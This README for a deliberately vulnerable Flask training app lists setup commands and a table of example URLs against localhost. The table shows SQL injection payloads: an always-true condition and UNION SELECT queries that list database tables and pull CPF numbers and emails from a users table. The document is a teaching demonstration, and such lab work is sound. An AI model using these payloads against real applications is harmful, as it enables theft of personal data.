# Flask Vulnerable to SQL Injection 💉🔓

## Setup

```
sudo apt install python3-virtualenv
virtualenv -p python3 venv
source venv/bin/activate
pip3 install -r requriments.txt
python3 src/main.py
```

## Esempi

| [/challenges/111.111.111-11](http://localhost:5000/challenges/111.111.111-11)                                                                                                                                                                                                                                                 | Expected usage                                   |
| [/challenges/' or '1' = '1](http://localhost:5000/challenges/'%20or%20'1'%20=%20'1)                                                                                                                                                                                                                                           | Vulnerability proof                              |
| [/challenges/' AND '1' = '2' UNION SELECT name FROM sqlite_master WHERE type ='table' AND name NOT LIKE 'sqlite_%](http://localhost:5000/challenges/'%20AND%20'1'%20=%20'2'%20UNION%20SELECT%20name%20FROM%20sqlite_master%20WHERE%20type%20='table'%20AND%20name%20NOT%20LIKE%20'sqlite_%)                                   | Breaks server                                    |
| [/challenges/' AND '1' = '2' UNION SELECT 'table_name', name FROM sqlite_master WHERE type = 'table' AND name NOT LIKE 'sqlite_%](http://localhost:5000/challenges/'%20AND%20'1'%20=%20'2'%20UNION%20SELECT%20'table_name',%20name%20FROM%20sqlite_master%20WHERE%20type%20=%20'table'%20AND%20name%20NOT%20LIKE%20'sqlite_%) | Queries all tables and fixes broken server       |
| [/challenges/' AND '1' = '2' UNION SELECT cpf, email FROM users; --](http://localhost:5000/challenges/'%20AND%20'1'%20=%20'2'%20UNION%20SELECT%20cpf,%20email%20FROM%20users;%20--)                                                                                                                                           | Use union select to query data from other tables |
